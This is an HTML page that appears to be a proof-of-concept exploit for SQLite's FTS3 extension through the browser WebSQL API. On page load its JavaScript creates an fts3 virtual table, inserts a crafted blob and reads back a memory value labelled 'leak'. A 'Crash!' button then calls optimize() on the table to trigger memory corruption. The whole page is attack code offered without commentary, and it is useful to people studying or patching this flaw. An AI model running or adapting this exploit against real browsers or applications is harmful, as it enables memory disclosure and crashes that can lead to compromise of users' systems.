<!DOCTYPE HTML>
<html>
<head>
  <style>
    body {
      width: 640px;
      margin: 40px auto;
      font-size: 32px;
    }
    button {
      font-family: monospace;
      font-size: 32px;
    }
  </style>
</head>
<body onload=leak()>
<div><button id="execute">Crash!</button></div>
<hr />
<div id="logger">Log</div>
<script type="text/javascript">
var $ = document.getElementById.bind(document);
var logger = $('logger');


function log(msg) {
    var pre = document.createElement('pre');
    pre.textContent = msg;
    logger.appendChild(pre);
}


function str2ab(str) {
  var buf = new ArrayBuffer(str.length);
  var bufView = new Uint8Array(buf);
  for (var i = 0, strLen = str.length; i < strLen; i++) {
    bufView[i] = str.charCodeAt(i);
  }
  return buf;
}


function unpack32(str) {
    var ab = str2ab(str);
    var dv = new DataView(ab, 0, 4);
    return dv.getUint32(0, true);
}


function hex2bin(hexx) {
    var hex = hexx.toString();
    var str = '';
    for (var i = 0; i < hex.length; i += 2)
        str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    return str;
}


function hex(num) {
    return '0x' + num.toString(16);
}


var db = openDatabase('mydb', '1.0', 'Test DB', 1024 * 1024);


function leak() {
    db.transaction(function (tx) {
        tx.executeSql('select sqlite_version() as x;', [], function (tx, results) {
            tmp_csr = results.rows.item(0).x;
            log('sqlite version: ' + tmp_csr);
        });
        tx.executeSql('drop table if exists a;')
        tx.executeSql('create virtual table a using fts3(b);');
        tx.executeSql("insert into a values (x'41414141');");


        tx.executeSql('select hex(a) as x from a;', [], function (tx, results) {
            tmp_csr = unpack32(hex2bin(results.rows.item(0).x));
            log('leak: ' + hex(tmp_csr));
        });
    });
}


function crash() {
    db.transaction(function (tx) {
        tx.executeSql('drop table if exists a;')
        tx.executeSql('create virtual table a using fts3(b);');
        tx.executeSql("insert into a values (x'41414141');");
        tx.executeSql('select optimize(b) from a;');
    });
}


$('execute').onclick = function() {
    try {
        crash();
    }
    catch (err) {
        log(err.message);
    }
}


</script>
</body>
</html>
